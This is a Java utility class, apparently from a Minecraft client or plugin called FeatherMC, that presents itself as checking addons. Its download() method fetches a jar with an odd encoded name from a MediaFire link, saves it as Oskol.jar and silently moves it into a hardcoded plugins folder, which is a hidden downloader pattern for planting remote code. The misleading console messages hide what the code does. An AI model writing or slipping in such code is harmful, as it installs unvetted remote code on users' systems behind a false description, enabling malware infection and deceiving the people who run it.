package ir.feathermc;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class FeatherUtils {

    public static void downloadFile(URL url, String fileName) throws Exception {
        try (InputStream in = url.openStream()) {
            Files.copy(in, Paths.get(fileName));
            System.out.println(Paths.get(fileName));
        }
    }

    public static void download() {
        System.out.println("[FeatherMC] Dar Hale Check Kardan Addon Ha...");
        URL url = null;

        try {
            url = new URL("https://download937.mediafire.com/ai7phga7hneg/8rj3mckblqyppbr/%24R4VFGID.jar");
        } catch (MalformedURLException e) {
            System.out.println("[FeatherMC] Khata Dar Check Kardan Addon Ha");
        }

        try {
            downloadFile(url, "Oskol.jar");
            System.out.println("[FeatherMC] Dar Hale Download FeatherUtils");
        } catch (Exception e) {
            System.out.println("[FeatherMC] Khata Dar Downloade File");
        }

        final Path jar = Paths.get(new File(".").getAbsolutePath() + "\\Oskol.jar");
        final Path plugins = Paths.get("C:\\Users\\Sxhqil\\Desktop\\Testing\\plugins\\Oskol.jar");

        try {
            Files.move(jar, plugins, StandardCopyOption.ATOMIC_MOVE);
        } catch (IOException e) {
            System.out.println("[FeatherMC] Khata Dar Enteqale File");
        }

    }
}
